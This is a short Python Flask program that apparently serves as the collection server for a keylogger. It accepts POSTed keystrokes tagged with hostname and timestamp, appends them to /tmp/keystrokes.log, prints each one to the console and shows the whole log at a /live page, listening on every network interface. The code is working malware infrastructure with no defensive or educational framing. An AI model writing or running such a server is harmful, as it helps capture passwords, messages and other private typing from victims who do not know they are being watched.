from flask import Flask, request, jsonify
from threading import Lock
import logging
import os

app = Flask(__name__)
log_lock = Lock()
KEYLOG_FILE = "/tmp/keystrokes.log"

@app.route('/log', methods=['POST'])
def handle_keylog():
    with log_lock:
        try:
            data = request.json
            with open(KEYLOG_FILE, "a") as f:
                f.write(f"[{data['timestamp']}] {data['hostname']}: {data['keystrokes']}\n")
                
            # Real-time console display
            print(f"\033[92mNEW KEYLOG\033[0m | {data['hostname']} | {data['keystrokes']}")
            return jsonify({"status": "success"}), 200
            
        except Exception as e:
            logging.error(f"Error: {str(e)}")
            return jsonify({"status": "error"}), 500

@app.route('/live', methods=['GET'])
def live_view():
    if not os.path.exists(KEYLOG_FILE):  # check existence
        return "<pre>No logs yet.</pre>", 200

    with open(KEYLOG_FILE, "r") as f:
        return f"<pre>{f.read()}</pre>", 200


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
